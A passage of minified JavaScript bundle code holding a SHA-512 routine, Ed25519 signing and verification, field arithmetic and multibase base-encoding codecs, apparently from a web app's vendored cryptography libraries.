v=tn.rotrSH(h,m,14)^tn.rotrSH(h,m,18)^tn.rotrBH(h,m,41),k=tn.rotrSL(h,m,14)^tn.rotrSL(h,m,18)^tn.rotrBL(h,m,41),O=h&b^~h&y,_=m&w^~m&E,I=tn.add5L(R,k,_,Dve[S],Lh[S]),T=tn.add5H(I,A,v,O,kve[S],Uh[S]),B=I|0,U=tn.rotrSH(r,i,28)^tn.rotrBH(r,i,34)^tn.rotrBH(r,i,39),M=tn.rotrSL(r,i,28)^tn.rotrBL(r,i,34)^tn.rotrBL(r,i,39),N=r&s^r&a^s&a,q=i&o^i&c^o&c;A=y|0,R=E|0,y=b|0,E=w|0,b=h|0,w=m|0,{h,l:m}=tn.add(l|0,f|0,T|0,B|0),l=a|0,f=c|0,a=s|0,c=o|0,s=r|0,o=i|0;const P=tn.add3L(B,M,q);r=tn.add3H(P,T,U,N),i=P|0}({h:r,l:i}=tn.add(this.Ah|0,this.Al|0,r|0,i|0)),{h:s,l:o}=tn.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=tn.add(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:f}=tn.add(this.Dh|0,this.Dl|0,l|0,f|0),{h,l:m}=tn.add(this.Eh|0,this.El|0,h|0,m|0),{h:b,l:w}=tn.add(this.Fh|0,this.Fl|0,b|0,w|0),{h:y,l:E}=tn.add(this.Gh|0,this.Gl|0,y|0,E|0),{h:A,l:R}=tn.add(this.Hh|0,this.Hl|0,A|0,R|0),this.set(r,i,s,o,a,c,l,f,h,m,b,w,y,E,A,R)}roundClean(){Uh.fill(0),Lh.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};const jve=uve(()=>new Bve);const aB=BigInt(0),sie=BigInt(1),Mve=BigInt(2);function cB(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function uB(t){if(!cB(t))throw new Error("Uint8Array expected")}function qN(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const Uve=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function lB(t){uB(t);let e="";for(let n=0;n<t.length;n++)e+=Uve[t[n]];return e}function oie(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?aB:BigInt("0x"+t)}const kd={_0:48,_9:57,A:65,F:70,a:97,f:102};function qH(t){if(t>=kd._0&&t<=kd._9)return t-kd._0;if(t>=kd.A&&t<=kd.F)return t-(kd.A-10);if(t>=kd.a&&t<=kd.f)return t-(kd.a-10)}function aie(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,s=0;i<n;i++,s+=2){const o=qH(t.charCodeAt(s)),a=qH(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}r[i]=o*16+a}return r}function Lve(t){return oie(lB(t))}function qT(t){return uB(t),oie(lB(Uint8Array.from(t).reverse()))}function cie(t,e){return aie(t.toString(16).padStart(e*2,"0"))}function Vk(t,e){return cie(t,e).reverse()}function Dd(t,e,n){let r;if(typeof e=="string")try{r=aie(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(cB(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function VH(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];uB(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const s=t[r];n.set(s,i),i+=s.length}return n}const VN=t=>typeof t=="bigint"&&aB<=t;function Fve(t,e,n){return VN(t)&&VN(e)&&VN(n)&&e<=t&&t<n}function Ev(t,e,n,r){if(!Fve(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function $ve(t){let e;for(e=0;t>aB;t>>=sie,e+=1);return e}const Hve=t=>(Mve<<BigInt(t-1))-sie,zve={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||cB(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function dB(t,e,n={}){const r=(i,s,o)=>{const a=zve[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))r(i,s,!1);for(const[i,s]of Object.entries(n))r(i,s,!0);return t}function WH(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const s=t(n,...r);return e.set(n,s),s}}const ns=BigInt(0),yi=BigInt(1),Tm=BigInt(2),qve=BigInt(3),Wk=BigInt(4),GH=BigInt(5),KH=BigInt(8);function zi(t,e){const n=t%e;return n>=ns?n:e+n}function Vve(t,e,n){if(e<ns)throw new Error("invalid exponent, negatives unsupported");if(n<=ns)throw new Error("invalid modulus");if(n===yi)return ns;let r=yi;for(;e>ns;)e&yi&&(r=r*t%n),t=t*t%n,e>>=yi;return r}function bl(t,e,n){let r=t;for(;e-- >ns;)r*=r,r%=n;return r}function ZH(t,e){if(t===ns)throw new Error("invert: expected non-zero number");if(e<=ns)throw new Error("invert: expected positive modulus, got "+e);let n=zi(t,e),r=e,i=ns,s=yi;for(;n!==ns;){const o=r/n,a=r%n,c=i-s*o;r=n,n=a,i=s,s=c}if(r!==yi)throw new Error("invert: does not exist");return zi(i,e)}function Wve(t){const e=(t-yi)/Tm;let n,r,i;for(n=t-yi,r=0;n%Tm===ns;n/=Tm,r++);for(i=Tm;i<t&&Vve(i,e,t)!==t-yi;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const o=(t+yi)/Wk;return function(a,c){const l=a.pow(c,o);if(!a.eql(a.sqr(l),c))throw new Error("Cannot find square root");return l}}const s=(n+yi)/Tm;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=r,l=o.pow(o.mul(o.ONE,i),n),f=o.pow(a,s),h=o.pow(a,n);for(;!o.eql(h,o.ONE);){if(o.eql(h,o.ZERO))return o.ZERO;let m=1;for(let w=o.sqr(h);m<c&&!o.eql(w,o.ONE);m++)w=o.sqr(w);const b=o.pow(l,yi<<BigInt(c-m-1));l=o.sqr(b),f=o.mul(f,b),h=o.mul(h,l),c=m}return f}}function Gve(t){if(t%Wk===qve){const e=(t+yi)/Wk;return function(n,r){const i=n.pow(r,e);if(!n.eql(n.sqr(i),r))throw new Error("Cannot find square root");return i}}if(t%KH===GH){const e=(t-GH)/KH;return function(n,r){const i=n.mul(r,Tm),s=n.pow(i,e),o=n.mul(r,s),a=n.mul(n.mul(o,Tm),s),c=n.mul(o,n.sub(a,n.ONE));if(!n.eql(n.sqr(c),r))throw new Error("Cannot find square root");return c}}return Wve(t)}const Kve=(t,e)=>(zi(t,e)&yi)===yi,Zve=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function Yve(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=Zve.reduce((r,i)=>(r[i]="function",r),e);return dB(t,n)}function Qve(t,e,n){if(n<ns)throw new Error("invalid exponent, negatives unsupported");if(n===ns)return t.ONE;if(n===yi)return e;let r=t.ONE,i=e;for(;n>ns;)n&yi&&(r=t.mul(r,i)),i=t.sqr(i),n>>=yi;return r}function Jve(t,e){const n=new Array(e.length),r=e.reduce((s,o,a)=>t.is0(o)?s:(n[a]=s,t.mul(s,o)),t.ONE),i=t.inv(r);return e.reduceRight((s,o,a)=>t.is0(o)?s:(n[a]=t.mul(s,n[a]),t.mul(s,o)),i),n}function uie(t,e){const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function lie(t,e,n=!1,r={}){if(t<=ns)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=uie(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:s,MASK:Hve(i),ZERO:ns,ONE:yi,create:c=>zi(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return ns<=c&&c<t},is0:c=>c===ns,isOdd:c=>(c&yi)===yi,neg:c=>zi(-c,t),eql:(c,l)=>c===l,sqr:c=>zi(c*c,t),add:(c,l)=>zi(c+l,t),sub:(c,l)=>zi(c-l,t),mul:(c,l)=>zi(c*l,t),pow:(c,l)=>Qve(a,c,l),div:(c,l)=>zi(c*ZH(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>ZH(c,t),sqrt:r.sqrt||(c=>(o||(o=Gve(t)),o(a,c))),invertBatch:c=>Jve(a,c),cmov:(c,l,f)=>f?l:c,toBytes:c=>n?Vk(c,s):cie(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return n?qT(c):Lve(c)}});return Object.freeze(a)}const YH=BigInt(0),M3=BigInt(1);function WN(t,e){const n=e.negate();return t?n:e}function die(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function GN(t,e){die(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1);return{windows:n,windowSize:r}}function Xve(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function e2e(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const KN=new WeakMap,fie=new WeakMap;function ZN(t){return fie.get(t)||1}function t2e(t,e){return{constTimeNegate:WN,hasPrecomputes(n){return ZN(n)!==1},unsafeLadder(n,r,i=t.ZERO){let s=n;for(;r>YH;)r&M3&&(i=i.add(s)),s=s.double(),r>>=M3;return i},precomputeWindow(n,r){const{windows:i,windowSize:s}=GN(r,e),o=[];let a=n,c=a;for(let l=0;l<i;l++){c=a,o.push(c);for(let f=1;f<s;f++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(n,r,i){const{windows:s,windowSize:o}=GN(n,e);let a=t.ZERO,c=t.BASE;const l=BigInt(2**n-1),f=2**n,h=BigInt(n);for(let m=0;m<s;m++){const b=m*o;let w=Number(i&l);i>>=h,w>o&&(w-=f,i+=M3);const y=b,E=b+Math.abs(w)-1,A=m%2!==0,R=w<0;w===0?c=c.add(WN(A,r[y])):a=a.add(WN(R,r[E]))}return{p:a,f:c}},wNAFUnsafe(n,r,i,s=t.ZERO){const{windows:o,windowSize:a}=GN(n,e),c=BigInt(2**n-1),l=2**n,f=BigInt(n);for(let h=0;h<o;h++){const m=h*a;if(i===YH)break;let b=Number(i&c);if(i>>=f,b>a&&(b-=l,i+=M3),b===0)continue;let w=r[m+Math.abs(b)-1];b<0&&(w=w.negate()),s=s.add(w)}return s},getPrecomputes(n,r,i){let s=KN.get(r);return s||(s=this.precomputeWindow(r,n),n!==1&&KN.set(r,i(s))),s},wNAFCached(n,r,i){const s=ZN(n);return this.wNAF(s,this.getPrecomputes(s,n,i),r)},wNAFCachedUnsafe(n,r,i,s){const o=ZN(n);return o===1?this.unsafeLadder(n,r,s):this.wNAFUnsafe(o,this.getPrecomputes(o,n,i),r,s)},setWindowSize(n,r){die(r,e),fie.set(n,r),KN.delete(n)}}}function n2e(t,e,n,r){if(Xve(n,t),e2e(r,e),n.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,s=$ve(BigInt(n.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(i),l=Math.floor((e.BITS-1)/o)*o;let f=i;for(let h=l;h>=0;h-=o){c.fill(i);for(let b=0;b<r.length;b++){const w=r[b],y=Number(w>>BigInt(h)&BigInt(a));c[y]=c[y].add(n[b])}let m=i;for(let b=c.length-1,w=i;b>0;b--)w=w.add(c[b]),m=m.add(w);if(f=f.add(m),h!==0)for(let b=0;b<o;b++)f=f.double()}return f}function r2e(t){return Yve(t.Fp),dB(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...uie(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}const du=BigInt(0),$o=BigInt(1),U3=BigInt(2),i2e=BigInt(8),s2e={zip215:!0};function o2e(t){const e=r2e(t);return dB(t,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function a2e(t){const e=o2e(t),{Fp:n,n:r,prehash:i,hash:s,randomBytes:o,nByteLength:a,h:c}=e,l=U3<<BigInt(a*8)-$o,f=n.create,h=lie(e.n,e.nBitLength),m=e.uvRatio||((P,C)=>{try{return{isValid:!0,value:n.sqrt(P*n.inv(C))}}catch{return{isValid:!1,value:du}}}),b=e.adjustScalarBytes||(P=>P),w=e.domain||((P,C,j)=>{if(qN("phflag",j),C.length||j)throw new Error("Contexts/pre-hash are not supported");return P});function y(P,C){Ev("coordinate "+P,C,du,l)}function E(P){if(!(P instanceof S))throw new Error("ExtendedPoint expected")}const A=WH((P,C)=>{const{ex:j,ey:z,ez:$}=P,H=P.is0();C==null&&(C=H?i2e:n.inv($));const L=f(j*C),V=f(z*C),G=f($*C);if(H)return{x:du,y:$o};if(G!==$o)throw new Error("invZ was invalid");return{x:L,y:V}}),R=WH(P=>{const{a:C,d:j}=e;if(P.is0())throw new Error("bad point: ZERO");const{ex:z,ey:$,ez:H,et:L}=P,V=f(z*z),G=f($*$),Z=f(H*H),J=f(Z*Z),ne=f(V*C),re=f(Z*f(ne+G)),le=f(J+f(j*f(V*G)));if(re!==le)throw new Error("bad point: equation left != right (1)");const oe=f(z*$),ue=f(H*L);if(oe!==ue)throw new Error("bad point: equation left != right (2)");return!0});class S{constructor(C,j,z,$){this.ex=C,this.ey=j,this.ez=z,this.et=$,y("x",C),y("y",j),y("z",z),y("t",$),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(C){if(C instanceof S)throw new Error("extended point not allowed");const{x:j,y:z}=C||{};return y("x",j),y("y",z),new S(j,z,$o,f(j*z))}static normalizeZ(C){const j=n.invertBatch(C.map(z=>z.ez));return C.map((z,$)=>z.toAffine(j[$])).map(S.fromAffine)}static msm(C,j){return n2e(S,h,C,j)}_setWindowSize(C){O.setWindowSize(this,C)}assertValidity(){R(this)}equals(C){E(C);const{ex:j,ey:z,ez:$}=this,{ex:H,ey:L,ez:V}=C,G=f(j*V),Z=f(H*$),J=f(z*V),ne=f(L*$);return G===Z&&J===ne}is0(){return this.equals(S.ZERO)}negate(){return new S(f(-this.ex),this.ey,this.ez,f(-this.et))}double(){const{a:C}=e,{ex:j,ey:z,ez:$}=this,H=f(j*j),L=f(z*z),V=f(U3*f($*$)),G=f(C*H),Z=j+z,J=f(f(Z*Z)-H-L),ne=G+L,re=ne-V,le=G-L,oe=f(J*re),ue=f(ne*le),be=f(J*le),Me=f(re*ne);return new S(oe,ue,Me,be)}add(C){E(C);const{a:j,d:z}=e,{ex:$,ey:H,ez:L,et:V}=this,{ex:G,ey:Z,ez:J,et:ne}=C;if(j===BigInt(-1)){const Et=f((H-$)*(Z+G)),ze=f((H+$)*(Z-G)),Re=f(ze-Et);if(Re===du)return this.double();const xn=f(L*U3*ne),Ln=f(V*U3*J),Nn=Ln+xn,Ne=ze+Et,Ve=Ln-xn,Qe=f(Nn*Re),dt=f(Ne*Ve),cr=f(Nn*Ve),ui=f(Re*Ne);return new S(Qe,dt,ui,cr)}const re=f($*G),le=f(H*Z),oe=f(V*z*ne),ue=f(L*J),be=f(($+H)*(G+Z)-re-le),Me=ue-oe,Te=ue+oe,Oe=f(le-j*re),Ke=f(be*Me),it=f(Te*Oe),at=f(be*Oe),At=f(Me*Te);return new S(Ke,it,At,at)}subtract(C){return this.add(C.negate())}wNAF(C){return O.wNAFCached(this,C,S.normalizeZ)}multiply(C){const j=C;Ev("scalar",j,$o,r);const{p:z,f:$}=this.wNAF(j);return S.normalizeZ([z,$])[0]}multiplyUnsafe(C,j=S.ZERO){const z=C;return Ev("scalar",z,du,r),z===du?k:this.is0()||z===$o?this:O.wNAFCachedUnsafe(this,z,S.normalizeZ,j)}isSmallOrder(){return this.multiplyUnsafe(c).is0()}isTorsionFree(){return O.unsafeLadder(this,r).is0()}toAffine(C){return A(this,C)}clearCofactor(){const{h:C}=e;return C===$o?this:this.multiplyUnsafe(C)}static fromHex(C,j=!1){const{d:z,a:$}=e,H=n.BYTES;C=Dd("pointHex",C,H),qN("zip215",j);const L=C.slice(),V=C[H-1];L[H-1]=V&-129;const G=qT(L),Z=j?l:n.ORDER;Ev("pointHex.y",G,du,Z);const J=f(G*G),ne=f(J-$o),re=f(z*J-$);let{isValid:le,value:oe}=m(ne,re);if(!le)throw new Error("Point.fromHex: invalid y coordinate");const ue=(oe&$o)===$o,be=(V&128)!==0;if(!j&&oe===du&&be)throw new Error("Point.fromHex: x=0 and x_0=1");return be!==ue&&(oe=f(-oe)),S.fromAffine({x:oe,y:G})}static fromPrivateKey(C){return T(C).point}toRawBytes(){const{x:C,y:j}=this.toAffine(),z=Vk(j,n.BYTES);return z[z.length-1]|=C&$o?128:0,z}toHex(){return lB(this.toRawBytes())}}S.BASE=new S(e.Gx,e.Gy,$o,f(e.Gx*e.Gy)),S.ZERO=new S(du,$o,$o,du);const{BASE:v,ZERO:k}=S,O=t2e(S,a*8);function _(P){return zi(P,r)}function I(P){return _(qT(P))}function T(P){const C=n.BYTES;P=Dd("private key",P,C);const j=Dd("hashed private key",s(P),2*C),z=b(j.slice(0,C)),$=j.slice(C,2*C),H=I(z),L=v.multiply(H),V=L.toRawBytes();return{head:z,prefix:$,scalar:H,point:L,pointBytes:V}}function B(P){return T(P).pointBytes}function U(P=new Uint8Array,...C){const j=VH(...C);return I(s(w(j,Dd("context",P),!!i)))}function M(P,C,j={}){P=Dd("message",P),i&&(P=i(P));const{prefix:z,scalar:$,pointBytes:H}=T(C),L=U(j.context,z,P),V=v.multiply(L).toRawBytes(),G=U(j.context,V,H,P),Z=_(L+G*$);Ev("signature.s",Z,du,r);const J=VH(V,Vk(Z,n.BYTES));return Dd("result",J,n.BYTES*2)}const N=s2e;function q(P,C,j,z=N){const{context:$,zip215:H}=z,L=n.BYTES;P=Dd("signature",P,2*L),C=Dd("message",C),j=Dd("publicKey",j,L),H!==void 0&&qN("zip215",H),i&&(C=i(C));const V=qT(P.slice(L,2*L));let G,Z,J;try{G=S.fromHex(j,H),Z=S.fromHex(P.slice(0,L),H),J=v.multiplyUnsafe(V)}catch{return!1}if(!H&&G.isSmallOrder())return!1;const ne=U($,Z.toRawBytes(),G.toRawBytes(),C);return Z.add(G.multiplyUnsafe(ne)).subtract(J).clearCofactor().equals(S.ZERO)}return v._setWindowSize(8),{CURVE:e,getPublicKey:B,sign:M,verify:q,ExtendedPoint:S,utils:{getExtendedPublicKey:T,randomPrivateKey:()=>o(n.BYTES),precompute(P=8,C=S.BASE){return C._setWindowSize(P),C.multiply(BigInt(3)),C}}}}BigInt(0),BigInt(1);const fB=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),QH=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const c2e=BigInt(1),JH=BigInt(2);BigInt(3);const u2e=BigInt(5),l2e=BigInt(8);function d2e(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),s=fB,o=t*t%s*t%s,a=bl(o,JH,s)*o%s,c=bl(a,c2e,s)*t%s,l=bl(c,u2e,s)*c%s,f=bl(l,e,s)*l%s,h=bl(f,n,s)*f%s,m=bl(h,r,s)*h%s,b=bl(m,i,s)*m%s,w=bl(b,i,s)*m%s,y=bl(w,e,s)*l%s;return{pow_p_5_8:bl(y,JH,s)*t%s,b2:o}}function f2e(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}function h2e(t,e){const n=fB,r=zi(e*e*e,n),i=zi(r*r*e,n),s=d2e(t*i).pow_p_5_8;let o=zi(t*r*s,n);const a=zi(e*o*o,n),c=o,l=zi(o*QH,n),f=a===t,h=a===zi(-t,n),m=a===zi(-t*QH,n);return f&&(o=c),(h||m)&&(o=l),Kve(o,n)&&(o=zi(-o,n)),{isValid:f||h,value:o}}const p2e=lie(fB,void 0,!0),m2e={a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:p2e,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:l2e,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:jve,randomBytes:rie,adjustScalarBytes:f2e,uvRatio:h2e},hie=a2e(m2e),g2e="EdDSA",y2e="JWT",Ex=".",HI="base64url",pie="utf8",mie="utf8",b2e=":",w2e="did",v2e="key",XH="base58btc",E2e="z",_2e="K36",A2e=32;function hB(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function gie(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?hB(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function yie(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const n=gie(e);let r=0;for(const i of t)n.set(i,r),r+=i.length;return hB(n)}function C2e(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(n[o]!==255)throw new TypeError(s+" is ambiguous");n[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),f=Math.log(256)/Math.log(a);function h(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var y=0,E=0,A=0,R=w.length;A!==R&&w[A]===0;)A++,y++;for(var S=(R-A)*f+1>>>0,v=new Uint8Array(S);A!==R;){for(var k=w[A],O=0,_=S-1;(k!==0||O<E)&&_!==-1;_--,O++)k+=256*v[_]>>>0,v[_]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");E=O,A++}for(var I=S-E;I!==S&&v[I]===0;)I++;for(var T=c.repeat(y);I<S;++I)T+=t.charAt(v[I]);return T}function m(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;var y=0;if(w[y]!==" "){for(var E=0,A=0;w[y]===c;)E++,y++;for(var R=(w.length-y)*l+1>>>0,S=new Uint8Array(R);w[y];){var v=n[w.charCodeAt(y)];if(v===255)return;for(var k=0,O=R-1;(v!==0||k<A)&&O!==-1;O--,k++)v+=a*S[O]>>>0,S[O]=v%256>>>0,v=v/256>>>0;if(v!==0)throw new Error("Non-zero carry");A=k,y++}if(w[y]!==" "){for(var _=R-A;_!==R&&S[_]===0;)_++;for(var I=new Uint8Array(E+(R-_)),T=E;_!==R;)I[T++]=S[_++];return I}}}function b(w){var y=m(w);if(y)return y;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:m,decode:b}}var S2e=C2e,T2e=S2e;const bie=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},x2e=t=>new TextEncoder().encode(t),I2e=t=>new TextDecoder().decode(t);let R2e=class{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},P2e=class{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return wie(this,e)}},N2e=class{constructor(e){this.decoders=e}or(e){return wie(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const wie=(t,e)=>new N2e({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});let O2e=class{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new R2e(e,n,r),this.decoder=new P2e(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const zI=({name:t,prefix:e,encode:n,decode:r})=>new O2e(t,e,n,r),Z_=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=T2e(n,e);return zI({prefix:t,name:e,encode:r,decode:s=>bie(i(s))})},k2e=(t,e,n,r)=>{const i={};for(let f=0;f<e.length;++f)i[e[f]]=f;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*n/8|0);let a=0,c=0,l=0;for(let f=0;f<s;++f){const h=i[t[f]];if(h===void 0)throw new SyntaxError(`Non-${r} character`);c=c<<n|h,a+=n,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=n||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},D2e=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>n;)o-=n,s+=e[i&a>>o];if(o&&(s+=e[i&a<<n-o]),r)for(;s.length*n&7;)s+="=";return s},Is=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>zI({prefix:e,name:t,encode(i){return D2e(i,r,n)},decode(i){return k2e(i,r,n,t)}}),B2e=zI({prefix:"\0",name:"identity",encode:t=>I2e(t),decode:t=>x2e(t)});var j2e=Object.freeze({__proto__:null,identity:B2e});const M2e=Is({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var U2e=Object.freeze({__proto__:null,base2:M2e});const L2e=Is({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var F2e=Object.freeze({__proto__:null,base8:L2e});const $2e=Z_({prefix:"9",name:"base10",alphabet:"0123456789"});var H2e=Object.freeze({__proto__:null,base10:$2e});const z2e=Is({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),q2e=Is({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var V2e=Object.freeze({__proto__:null,base16:z2e,base16upper:q2e});const W2e=Is({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),G2e=Is({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),K2e=Is({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),Z2e=Is({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),Y2e=Is({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),Q2e=Is({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),J2e=Is({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),X2e=Is({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),eEe=Is({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var tEe=Object.freeze({__proto__:null,base32:W2e,base32upper:G2e,base32pad:K2e,base32padupper:Z2e,base32hex:Y2e,base32hexupper:Q2e,base32hexpad:J2e,base32hexpadupper:X2e,base32z:eEe});const nEe=Z_({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),rEe=Z_({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var iEe=Object.freeze({__proto__:null,base36:nEe,base36upper:rEe});const sEe=Z_({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),oEe=Z_({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var aEe=Object.freeze({__proto__:null,base58btc:sEe,base58flickr:oEe});const 